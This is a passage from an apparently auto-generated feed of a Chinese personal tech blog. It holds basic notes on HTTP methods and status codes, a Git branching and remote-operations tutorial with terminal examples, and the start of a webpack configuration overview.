<li><p>PUT<br>请求服务器将请求中的实体存储在请求资源下。通常服务器会关闭PUT方法，因为会在服务器建立文件，属于危险方法之一。</p>
</li>
<li><p>DELETE<br>请求服务器删除请求的指定资源。通常服务器会关闭DELETE方法，属于危险方法之一。</p>
</li>
<li><p>TRACE<br>允许客户端查看服务器端接收消息的情况，回显服务器收到的请求，此方法很少见。</p>
</li>
<li><p>CONNECT<br>为了能动态切换到隧道代理。<br>【HTTP隧道：】是HTTP/1.1中引入的功能，主要为了解决明文的HTTP代理无法代理跑在TLS中的流量(https)的问题，同时提供了作为任意流量的TCP通道的能力。<a href="https://www.zhihu.com/question/21955083" target="_blank" rel="noopener">什么是HTTP隧道，怎么理解HTTP隧道</a>。<br>HTTP隧道技术可以理解为把所有要传送的数据全部封装到HTTP协议里进行传送。<br>客户端与服务器之间的中间层：代理，网关，或者隧道。</p>
</li>
<li><p>OPTIONS<br>用于请求由URI标识的资源在通信过程中可以使用的功能选项。<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/OPTIONS.png" alt="OPTIONS请求与响应"></p>
</li>
</ul>
<h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><ul>
<li>1XX: 信息提示，表示请求已被成功接收，继续处理。100~101</li>
<li>2XX：成功，服务器成功处理了请求。200~206</li>
<li>3XX: 重定向。300~305</li>
<li>4XX: 客户端错误，客户端发送一些服务器无法处理的信息，例如格式错误的请求、请求一个不存在的URL。400~415</li>
<li>5XX: 服务器错误。500~505</li>
</ul>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/%E7%8A%B6%E6%80%81%E7%A0%81.png" alt="常见状态码错误"></p>
<h3 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h3><p>HTTPS在HTTP之下加入SSL层，可以保护数据的隐私性和完整性。</p>
<ul>
<li>HTTP传输的是明文，HTTPS则是具有安全性的SSL加密传输协议</li>
<li>HTTP 80端口，HTTPS 443端口</li>
<li>HTTPS需要申请CA证书</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《Web安全深度剖析》学习总结, 本部分主要包括WEB安全的基础知识和HTTP协议相关。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Web Security" scheme="http://yoursite.com/tags/Web-Security/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Git操作流程总结</title>
    <link href="http://yoursite.com/2018/05/16/git-reset/"/>
    <id>http://yoursite.com/2018/05/16/git-reset/</id>
    <published>2018-05-16T02:16:48.000Z</published>
    <updated>2018-05-29T01:47:06.339Z</updated>
    
    <content type="html"><![CDATA[<p>来自<a href="https://www.fengerzh.com/git-reset/" target="_blank" rel="noopener">Git的4个阶段的撤销更改</a>、<a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="noopener">Git远程操作详解</a>等博客的学习总结(PS:备份)。<br><a id="more"></a></p>
<h1 id="Git的基本概念"><a href="#Git的基本概念" class="headerlink" title="Git的基本概念"></a>Git的基本概念</h1><p>在创建Git仓库的时候，工作区会有一个隐藏目录.git（Git的版本库)，Git会自动创建一个master分支，以及一个指向master分支的指针<code>HEAD</code>。<br><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/git%E5%B7%A5%E4%BD%9C%E5%88%86%E5%8C%BA.png" alt="git工作分区"></p>
<p>如上图所示，Git的本地管理主要分为三个区，第一个工作区，第二个暂存区(statge/index)，第三个本地仓库。<br>1.工作区中文件的增删改，通过<code>git add &lt;file&gt;</code>将改动文件添加到暂存区</p>
<p>2.通过<code>git commit -m &quot;descriptions&quot;</code>将暂存区的多次改动提交到本地仓库</p>
<p>3.通过<code>git push</code>将本地仓库推送到远程仓库。</p>
<h1 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h1><p>每个人在各自的分支上开发，互相不影响，最后由管理员或者自己来合并分支，处理冲突，测试上线。</p>
<p>以下流程包括查看分支、新建并切换到dev分支、在dev分支修改文件后合并到master分支，最后删除dev分支的过程。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/%E5%88%87%E6%8D%A2%E5%88%86%E6%94%AF.png" alt="新建并切换分支"></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF.png" alt="合并分支"></p>
<p>下面的例子演示了从github clone一个<code>test</code>仓库到本地，并创建新分支dev，在新分支dev上修改文件，合并到主分支master，最后删除dev分支。（<strong>注意：</strong> 执行<code>git clone</code>命令是将远程仓库更新到本地仓库区，而不是本地工作区！）</p>
<p><strong>查看分支</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (master)</div><div class="line">$ git branch</div><div class="line">* master</div></pre></td></tr></table></figure></p>
<p><code>* master</code>表示当前分支为master。<br><strong>新建并切换分支</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (master)</div><div class="line">$ git checkout -b dev</div><div class="line">Switched to a new branch <span class="string">'dev'</span></div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (dev)</div><div class="line">$ git branch</div><div class="line">* dev</div><div class="line">  master</div></pre></td></tr></table></figure>
<p>使用<code>git branch</code>查看分支，共有两个分支，当前分支为<code>dev</code>。</p>
<p>接下来在test文件夹下新建read.txt，并执行<code>git add readme.txt</code>和<code>git commit -m &quot;添加文件测试&quot;</code>将变化从工作区提交到本地仓库区：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (dev)</div><div class="line">$ git add read.txt</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (dev)</div><div class="line">$ git commit -m <span class="string">"添加文件测试"</span></div><div class="line">[dev b150277] 添加文件测试</div><div class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</div><div class="line"> create mode 100644 read.txt</div></pre></td></tr></table></figure>
<p><strong>合并分支</strong><br>首先从dev分支切换回master分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (dev)</div><div class="line">$ git checkout master</div><div class="line">Switched to branch <span class="string">'master'</span></div><div class="line">Your branch is up-to-date with <span class="string">'origin/master'</span>.</div></pre></td></tr></table></figure></p>
<p>再执行合并dev分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (master)</div><div class="line">$ git merge dev</div><div class="line">Updating d521d20..b150277</div><div class="line">Fast-forward</div><div class="line"> read.txt | 0</div><div class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</div><div class="line"> create mode 100644 read.txt</div></pre></td></tr></table></figure></p>
<p>最后删除dev分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (master)</div><div class="line">$ git branch -d dev</div><div class="line">Deleted branch dev (was b150277).</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (master)</div><div class="line">$ git branch</div><div class="line">* master</div></pre></td></tr></table></figure>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/%E5%9B%A2%E9%98%9F%E5%90%88%E4%BD%9C%E5%88%86%E6%94%AF%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="团队合作分支"></p>
<h1 id="Git常用指令"><a href="#Git常用指令" class="headerlink" title="Git常用指令"></a>Git常用指令</h1><p><code>git --help</code>中常见的git操作指令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">start a working area (see also: git <span class="built_in">help</span> tutorial)</div><div class="line">   <span class="built_in">clone</span>      Clone a repository into a new directory</div><div class="line">   init       Create an empty Git repository or reinitialize an existing one</div><div class="line"></div><div class="line">work on the current change (see also: git <span class="built_in">help</span> everyday)</div><div class="line">   add        Add file contents to the index</div><div class="line">   mv         Move or rename a file, a directory, or a symlink</div><div class="line">   reset      Reset current HEAD to the specified state</div><div class="line">   rm         Remove files from the working tree and from the index</div><div class="line"></div><div class="line">examine the <span class="built_in">history</span> and state (see also: git <span class="built_in">help</span> revisions)</div><div class="line">   bisect     Use binary search to find the commit that introduced a bug</div><div class="line">   grep       Print lines matching a pattern</div><div class="line">   <span class="built_in">log</span>        Show commit logs</div><div class="line">   show       Show various types of objects</div><div class="line">   status     Show the working tree status</div><div class="line"></div><div class="line">grow, mark and tweak your common <span class="built_in">history</span></div><div class="line">   branch     List, create, or delete branches</div><div class="line">   checkout   Switch branches or restore working tree files</div><div class="line">   commit     Record changes to the repository</div><div class="line">   diff       Show changes between commits, commit and working tree, etc</div><div class="line">   merge      Join two or more development histories together</div><div class="line">   rebase     Reapply commits on top of another base tip</div><div class="line">   tag        Create, list, delete or verify a tag object signed with GPG</div><div class="line"></div><div class="line">collaborate (see also: git <span class="built_in">help</span> workflows)</div><div class="line">   fetch      Download objects and refs from another repository</div><div class="line">   pull       Fetch from and integrate with another repository or a <span class="built_in">local</span> branch</div><div class="line">   push       Update remote refs along with associated objects</div></pre></td></tr></table></figure></p>
<ul>
<li><code>git branch</code> 默认查看本地分支<br><code>git branch -a</code> 查看所有的分支<br><code>git branch -r</code> 查看远程分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (<span class="built_in">test</span>)</div><div class="line">$ git branch</div><div class="line">  master</div><div class="line">* <span class="built_in">test</span></div><div class="line"></div><div class="line"></div><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (<span class="built_in">test</span>)</div><div class="line">$ git branch -a</div><div class="line">  master</div><div class="line">* <span class="built_in">test</span></div><div class="line">  remotes/origin/HEAD -&gt; origin/master</div><div class="line">  remotes/origin/master</div><div class="line"></div><div class="line"></div><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/<span class="built_in">test</span> (<span class="built_in">test</span>)</div><div class="line">$ git branch -r</div><div class="line">  origin/HEAD -&gt; origin/master</div><div class="line">  origin/master</div></pre></td></tr></table></figure>
<h1 id="Git远程操作"><a href="#Git远程操作" class="headerlink" title="Git远程操作"></a>Git远程操作</h1><p><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/git%E8%BF%9C%E7%A8%8B%E6%93%8D%E4%BD%9C.jpg" alt="git远程操作示意图"></p>
<h2 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h2><p><code>git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;</code></p>
<p>从远程主机克隆一个版本库，若不带第二个参数，会在本地主机生成一个与远程主机版本库同名的版本库。eg, 克隆github仓库test到本机，并命名为testLocal:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop</div><div class="line">$ git <span class="built_in">clone</span> https://github.com/shirley5li/<span class="built_in">test</span> testLocal</div></pre></td></tr></table></figure></p>
<h2 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h2><p>Git要求每个远程主机都必须指定一个主机名。<code>git remote</code>命令就用于管理主机名。</p>
<ul>
<li><p>不带参数时，<code>git remote</code>命令查看所有远程主机名:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/testLocal (master)</div><div class="line">$ git remote</div><div class="line">origin</div></pre></td></tr></table></figure>
</li>
<li><p>带<code>-v</code>参数，可以查看所有远程主机名对应的网址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Shirley@DESKTOP-G6LSDJO MINGW64 ~/Desktop/testLocal (master)</div><div class="line">$ git remote -v</div><div class="line">origin  https://github.com/shirley5li/<span class="built_in">test</span> (fetch)</div><div class="line">origin  https://github.com/shirley5li/<span class="built_in">test</span> (push)</div></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>注意：</strong> 克隆版本库的时候，所使用的远程主机名自动被Git命名为origin，如果想用其他的主机名，需要用<code>git clone</code>命令的<code>-o</code>参数指定。例如，克隆时指定远程主机名为Test，可以使用 <code>git clone -o Test https://github.com/shirley5li/test</code>。</p>
<ul>
<li><p><code>git remote show &lt;主机名&gt;</code>，查看主机详细信息。</p>
</li>
<li><p><code>git remote add &lt;主机名&gt; &lt;网址&gt;</code>，用于添加远程主机。</p>
</li>
<li><p><code>git remote rm &lt;主机名&gt;</code>，删除远程主机。</p>
</li>
<li><p><code>git remote rename &lt;原主机名&gt; &lt;新主机名&gt;</code>，更改远程主机的名字。</p>
</li>
</ul>
<h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><ul>
<li>用法： <code>git fetch &lt;远程主机名&gt; &lt;分支名&gt;</code></li>
</ul>
<p>用于将远程主机版本库的更新取回到本地，但不会对本地的开发代码产生影响，当不指定<code>&lt;分支名&gt;</code>时，默认取回所有分支的更新。(若要作用到本地代码，还需要配合使用<code>git merge</code>)</p>
<p><strong>注意：</strong> 所取回的更新，在本地主机上要用”远程主机名/分支名”的形式读取。比如<code>origin</code>主机的<code>master</code>，就要用<code>origin/master</code>读取。查看远程分支(<code>-a</code>表示查看所有分支)：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ git branch -r</div><div class="line">origin/master</div><div class="line"></div><div class="line">$ git branch -a</div><div class="line">* master</div><div class="line">  remotes/origin/master</div></pre></td></tr></table></figure></p>
<ul>
<li><p>取回远程主机的更新以后，可以在它的基础上，使用<code>git checkout</code>命令创建一个新的分支：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout -b newBranch origin/master</div></pre></td></tr></table></figure>
</li>
<li><p>使用<code>git merge</code>或<code>git rebase</code>命令，在本地分支上合并远程分支。以下表示在当前分支上，合并<code>origin/master</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git merge origin/master</div><div class="line">$ git rebase origin/master</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><ul>
<li>用法： <code>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code></li>
</ul>
<p>用于取回远程主机某个分支的更新，再与本地的指定分支合并，如果远程分支是与当前分支合并，则冒号后面的部分可以省略。</p>
<p>例如，取回远程<code>origin/next</code>分支，再与当前分支合并，等同于先<code>git fetch</code>，再<code>git merge</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git pull origin next</div><div class="line"><span class="comment"># 等同于</span></div><div class="line">$ git fetch origin</div><div class="line">$ git merge origin/next</div></pre></td></tr></table></figure></p>
<ul>
<li>若当前分支与远程分支存在tracking关系，<code>git pull</code>可以省略远程分支名。</li>
</ul>
<p>在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在<code>git clone</code>的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，即本地的<code>master</code>分支自动tracking <code>origin/master</code>分支。</p>
<p>Git也允许手动建立追踪关系，如下指定本地<code>master</code>分支tracking <code>origin/next</code>分支：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch --<span class="built_in">set</span>-upstream master origin/next</div></pre></td></tr></table></figure></p>
<p>此时，<code>git pull</code>可以省略远程分支名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git pull origin</div></pre></td></tr></table></figure></p>
<ul>
<li>若当前分支只有一个tracking分支，还可以省略远程主机名：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git pull</div></pre></td></tr></table></figure>
<p>上面命令表示，当前分支自动与唯一一个tracking分支进行合并。</p>
<ul>
<li><p>采用<code>--rebase</code>模式: <code>git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code>【<a href="https://blog.csdn.net/wh_19910525/article/details/7554489" target="_blank" rel="noopener">git merge 和 git rebase 小结</a>】</p>
</li>
<li><p>加上参数 <code>-p</code></p>
</li>
</ul>
<p>如果远程主机删除了某个分支，默认情况下，<code>git pull</code>不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致<code>git pull</code>不知不觉删除了本地分支，通过添加参数<code>-p</code>可以在本地删除远程已经删除的分支。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git pull -p</div><div class="line"><span class="comment"># 等同于下面的命令</span></div><div class="line">$ git fetch --prune origin </div><div class="line">$ git fetch -p</div></pre></td></tr></table></figure></p>
<h2 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h2><ul>
<li>用法： <code>git push &lt;远程主机名&gt; &lt;本地分支&gt;:&lt;远程分支&gt;</code></li>
</ul>
<p>用于将本地分支的更新，推送到远程主机。</p>
<ul>
<li>省略远程分支名</li>
</ul>
<p>如果省略远程分支名，则表示将本地分支推送到与之存在tracking关系的远程分支（通常两者同名），如果该远程分支不存在，则会被新建，例如<code>git push origin master</code>表示将本地的<code>master</code>分支推送到<code>origin</code>主机的<code>master</code>分支，如果后者不存在，则会被新建。</p>
<ul>
<li>省略本地分支名</li>
</ul>
<p>表示删除指定的远程分支，等同于推送一个空的本地分支到远程分支，以下命令表示删除<code>origin</code>主机的<code>master</code>分支：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git push origin :master</div><div class="line"><span class="comment"># 等同于</span></div><div class="line">$ git push origin --delete master</div></pre></td></tr></table></figure></p>
<ul>
<li>省略本地分支和远程分支</li>
</ul>
<p>如果当前分支与远程分支之间存在tracking系，则本地分支和远程分支都可以省略: <code>git push origin</code>。</p>
<ul>
<li>省略远程主机名</li>
</ul>
<p>如果当前分支只有一个追踪分支，那么主机名也可以省略： <code>git push</code>。</p>
<h1 id="Git的4个阶段的撤销更改"><a href="#Git的4个阶段的撤销更改" class="headerlink" title="Git的4个阶段的撤销更改"></a>Git的4个阶段的撤销更改</h1><p><img src="http://ou3oh86t1.bkt.clouddn.com/git-reset/git-commands.png" alt="Git基本操作流程"></p>
<p>该部分内容假设只有一个主分支master。</p>
<h2 id="4个区"><a href="#4个区" class="headerlink" title="4个区"></a>4个区</h2><ul>
<li>工作区(Working Area)</li>
<li>暂存区(Stage)</li>
<li>本地仓库(Local Repository)</li>
<li>远程仓库(Remote Repository)</li>
</ul>
<h2 id="5种状态"><a href="#5种状态" class="headerlink" title="5种状态"></a>5种状态</h2><p>以上4个区，进入每一个区成功之后会产生一个状态，再加上最初始的一个状态，一共是5种状态。</p>
<ul>
<li>未修改(Origin)</li>
<li>已修改(Modified)</li>
<li>已暂存(Staged)</li>
<li>已提交(Committed)</li>
<li>已推送(Pushed)</li>
</ul>
<h2 id="检查修改"><a href="#检查修改" class="headerlink" title="检查修改"></a>检查修改</h2><h3 id="已修改，未暂存"><a href="#已修改，未暂存" class="headerlink" title="已修改，未暂存"></a>已修改，未暂存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff</div></pre></td></tr></table></figure>
<p><code>git diff</code>这个命令只检查工作区和暂存区之间的差异。</p>
<h3 id="已暂存，未提交"><a href="#已暂存，未提交" class="headerlink" title="已暂存，未提交"></a>已暂存，未提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff --cached</div></pre></td></tr></table></figure>
<p><code>git diff --cached</code>用于检查暂存区到本地仓库之间的差异。</p>
<h3 id="已提交，未推送"><a href="#已提交，未推送" class="headerlink" title="已提交，未推送"></a>已提交，未推送</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff master origin/master</div></pre></td></tr></table></figure>
<p>这里，<code>master</code>表示的本地仓库分支，而<code>origin/master</code>表示远程仓库分支。以上命令用于检查本地仓库与远程仓库之间的差异。</p>
<h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><h3 id="已修改，未暂存-1"><a href="#已修改，未暂存-1" class="headerlink" title="已修改，未暂存"></a>已修改，未暂存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout .</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --hard</div></pre></td></tr></table></figure></p>
<p>做完修改之后，如果你想向前走一步，让修改进入暂存区，就执行<code>git add .</code>，如果你想向后退一步，撤销刚才的修改，就执行<code>git checkout .</code>。</p>
<h3 id="已暂存，未提交-1"><a href="#已暂存，未提交-1" class="headerlink" title="已暂存，未提交"></a>已暂存，未提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git reset</div><div class="line">git checkout .</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --hard</div></pre></td></tr></table></figure></p>
<p><code>git reset</code>只是把修改退回到了<code>git add .</code>之前的状态，即文件本身还处于已修改未暂存状态，你如果想退回未修改状态，还需要执行<code>git checkout .</code>。</p>
<h3 id="已提交，未推送-1"><a href="#已提交，未推送-1" class="headerlink" title="已提交，未推送"></a>已提交，未推送</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --hard origin/master</div></pre></td></tr></table></figure>
<p>此刻的状态已经污染了本地仓库，需要从远程仓库把代码取回来。</p>
<h3 id="已推送"><a href="#已推送" class="headerlink" title="已推送"></a>已推送</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git reset --hard HEAD^</div><div class="line">git push -f</div></pre></td></tr></table></figure>
<p>此刻已经污染了远程仓库，需要先恢复本地仓库，再强制push到远程仓库。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自&lt;a href=&quot;https://www.fengerzh.com/git-reset/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Git的4个阶段的撤销更改&lt;/a&gt;、&lt;a href=&quot;http://www.ruanyifeng.com/blog/2014/06/git_remote.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Git远程操作详解&lt;/a&gt;等博客的学习总结(PS:备份)。&lt;br&gt;
    
    </summary>
    
      <category term="Git" scheme="http://yoursite.com/categories/Git/"/>
    
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>(二)Webpack相关概念总结</title>
    <link href="http://yoursite.com/2018/05/14/webpack-concepts-study/"/>
    <id>http://yoursite.com/2018/05/14/webpack-concepts-study/</id>
    <published>2018-05-14T01:19:45.000Z</published>
    <updated>2018-05-29T02:33:45.150Z</updated>
    
    <content type="html"><![CDATA[<p>关于webapck相关概念的学习总结。<br><a id="more"></a></p>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。</p>
<p>从 webpack v4.0.0 开始，可以不用引入配置文件，而webpack 仍然还是高度可配置的，通过在项目根目录下创建一个<code>webpack.config.js</code>文件用来配置webpack，在<a href="http://shirley5li.me/2018/05/14/webpack-start-first/" target="_blank" rel="noopener">(一)webpack入门总结</a>中已描述。</p>
<h2 id="入口-entry"><a href="#入口-entry" class="headerlink" title="入口(entry)"></a>入口(entry)</h2><p><strong>入口起点(entry point)</strong> 指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的。<br>eg: <a href="http://shirley5li.me/2018/05/14/webpack-start-first/" target="_blank" rel="noopener">(一)webpack入门总结</a>中<code>src/index.js</code>即为入口起点，如下：</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./src/index.js'</span>,   <span class="comment">//入口</span></div><div class="line">  output: &#123;   <span class="comment">//出口</span></div><div class="line">    filename: <span class="string">'main.js'</span>,</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>)</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p><strong>注意：</strong> <code>path</code>模块为node.js的核心模块，用来操作文件路径。</p>
<h2 id="出口-output"><a href="#出口-output" class="headerlink" title="出口(output)"></a>出口(output)</h2><p><code>output</code> 属性指示 webpack 在哪里输出它所创建的 bundles，以及如何命名这些文件，默认输出在 <code>./dist</code>文件夹下。<br>如上的<code>webpack.config.js</code>配置中的<code>output</code>字段即为配置出口，通过 <code>output.filename</code> 和 <code>output.path</code> 属性，指示生成的 bundle 名称，以及 bundle 生成(emit)到哪个目录下，示例中生成的bundle名称为<code>mian.js</code>，生成到根目录下的<code>dist</code>文件夹下。</p>
